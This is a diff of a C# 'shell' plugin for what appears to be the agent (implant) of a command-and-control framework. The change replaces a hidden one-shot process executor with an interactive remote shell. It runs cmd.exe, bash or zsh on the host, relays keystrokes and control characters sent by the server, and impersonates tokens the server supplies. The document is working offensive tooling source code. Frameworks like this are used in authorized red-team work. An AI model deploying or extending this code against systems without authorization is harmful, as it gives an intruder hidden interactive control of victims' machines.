@@ -1,14 +1,13 @@
-﻿using System.Diagnostics;
-using Agent.Interfaces;
+﻿using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
 
 namespace Agent
 {
-    public class Plugin : IPlugin
+    public class Plugin : IInteractivePlugin
     {
         public string Name => "shell";
-        Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
+        Dictionary<string, ProcessRunner> runningProcs = new Dictionary<string, ProcessRunner>();
         private IMessageManager messageManager { get; set; }
         private ITokenManager tokenManager { get; set; }
 
@@ -23,106 +22,129 @@ namespace Agent
             {
                 tokenManager.Impersonate(job.task.token);
             }
-            try
+
+            string shell = String.Empty;
+
+
+            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
+
+            if(args.ContainsKey("shell") && !string.IsNullOrEmpty(args["shell"]))
             {
-                await messageManager.AddResponse(ShellExec(job));
+                shell = args["shell"];
             }
-            catch (Exception e)
+            else
             {
-                //oh no an error
-                messageManager.Write(e.ToString(), job.task.id, true, "error");
+                if (OperatingSystem.IsWindows())
+                {
+                    // Windows
+                    shell = "cmd.exe";
+                }
+                else if (OperatingSystem.IsLinux())
+                {
+                    // Linux or macOS
+                    shell = "/bin/bash"; // You may need to adjust this based on the specific distribution or configuration.
+                }
+                else if (OperatingSystem.IsMacOS())
+                {
+                    shell = "/bin/zsh";
+                }
             }
+
+
+            ProcessRunner runner = new ProcessRunner(shell, job.task.id, messageManager);
+            runner.Start();
+            runningProcs.Add(job.task.id, runner);
             if (job.task.token != 0)
             {
                 tokenManager.Revert();
             }
         }
-        private async Task Kill(ServerJob job)
+
+
+        public void Interact(InteractMessage message)
         {
-            try
+            if (this.runningProcs.ContainsKey(message.task_id))
             {
-                if (runningProcs.ContainsKey(job.task.id))
+                switch (message.message_type)
                 {
-                    runningProcs[job.task.id].Kill();
-                    runningProcs[job.task.id].WaitForExit();
+                    case InteractiveMessageType.Input:
+                        this.runningProcs[message.task_id].Write(Misc.Base64Decode(message.data));
+                        break;
+                    case InteractiveMessageType.Output:
+                        break;
+                    case InteractiveMessageType.Error:
+                        break;
+                    case InteractiveMessageType.Exit:
+                        this.runningProcs[message.task_id].Stop();
+                        this.runningProcs.Remove(message.task_id);
+                        break;
+                    case InteractiveMessageType.Escape:
+                        this.runningProcs[message.task_id].Write(0x18);
+                        break;
+                    case InteractiveMessageType.CtrlA:
+                        this.runningProcs[message.task_id].Write(0x01);
+                        break;
+                    case InteractiveMessageType.CtrlB:
+                        this.runningProcs[message.task_id].Write(0x02);
+                        break;
+                    case InteractiveMessageType.CtrlC:
+                        this.runningProcs[message.task_id].Write(0x03);
+                        break;
+                    case InteractiveMessageType.CtrlD:
+                        this.runningProcs[message.task_id].Write(0x04);
+                        break;
+                    case InteractiveMessageType.CtrlE:
+                        this.runningProcs[message.task_id].Write(0x05);
+                        break;
+                    case InteractiveMessageType.CtrlF:
+                        this.runningProcs[message.task_id].Write(0x06);
+                        break;
+                    case InteractiveMessageType.CtrlG:
+                        this.runningProcs[message.task_id].Write(0x07);
+                        break;
+                    case InteractiveMessageType.Backspace:
+                        this.runningProcs[message.task_id].Write(0x08);
+                        break;
+                    case InteractiveMessageType.Tab:
+                        this.runningProcs[message.task_id].Write(0x09);
+                        break;
+                    case InteractiveMessageType.CtrlK:
+                        this.runningProcs[message.task_id].Write(0x0B);
+                        break;
+                    case InteractiveMessageType.CtrlL:
+                        this.runningProcs[message.task_id].Write(0x0C);
+                        break;
+                    case InteractiveMessageType.CtrlN:
+                        this.runningProcs[message.task_id].Write(0x0E);
+                        break;
+                    case InteractiveMessageType.CtrlP:
+                        this.runningProcs[message.task_id].Write(0x10);
+                        break;
+                    case InteractiveMessageType.CtrlQ:
+                        this.runningProcs[message.task_id].Write(0x11);
+                        break;
+                    case InteractiveMessageType.CtrlR:
+                        this.runningProcs[message.task_id].Write(0x12);
+                        break;
+                    case InteractiveMessageType.CtrlS:
+                        this.runningProcs[message.task_id].Write(0x13);
+                        break;
+                    case InteractiveMessageType.CtrlU:
+                        this.runningProcs[message.task_id].Write(0x15);
+                        break;
+                    case InteractiveMessageType.CtrlW:
+                        this.runningProcs[message.task_id].Write(0x17);
+                        break;
+                    case InteractiveMessageType.CtrlY:
+                        this.runningProcs[message.task_id].Write(0x19);
+                        break;
+                    case InteractiveMessageType.CtrlZ:
+                        this.runningProcs[message.task_id].Write(0x1A);
+                        break;
+                    default:
+                        break;
 
-                    await messageManager.AddResponse(new ResponseResult()
-                    {
-                        task_id = job.task.id,
-                        process_response = new Dictionary<string, string> { { "message", "0x0D" } },
-                        completed = true,
-                    });
                 }
-            }
-            catch (Exception e)
-            {
-
-                await messageManager.AddResponse(new ResponseResult()
-                {
-                    task_id = job.task.id,
-                    user_output = e.ToString(),
-                    completed = true,
-                    status = "error",
-                });
-            }
-        }
-        private ResponseResult ShellExec(ServerJob job)
-        {
-            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
-            string parameters = "";
-            if (!String.IsNullOrEmpty(args["arguments"]))
-            {
-                parameters = args["arguments"];
-            }
-
-            string executable = args["executable"];
-            Process process = new Process
-            {
-                StartInfo = new ProcessStartInfo()
-                {
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    FileName = executable,
-                    Arguments = parameters,
-                    RedirectStandardError = true,
-                    RedirectStandardOutput = true
-                }
-            };
-
-            try
-            {
-                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) messageManager.Write(errorLine.Data + Environment.NewLine, job.task.id, false, "error"); };
-                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) messageManager.Write(outputLine.Data + Environment.NewLine, job.task.id, false); };
-
-                process.Start();
-                process.BeginErrorReadLine();
-                process.BeginOutputReadLine();
-
-                process.WaitForExit();
-                ResponseResult result = new ResponseResult()
-                {
-                    user_output = Environment.NewLine + "Process Finished.",
-                    task_id = job.task.id,
-                    completed = true,
-                };
-
-                if (process.ExitCode != 0)
-                {
-                    result.status = "error";
-                    result.user_output += Environment.NewLine + "Process exited with code: " + process.ExitCode;
-                }
-                return result;
-            }
-            catch (Exception e)
-            {
-                return new ResponseResult()
-                {
-                    user_output = Environment.NewLine + e.ToString(),
-                    task_id = job.task.id,
-                    completed = true,
-                    status = "error"
-                };
             }
         }
     }
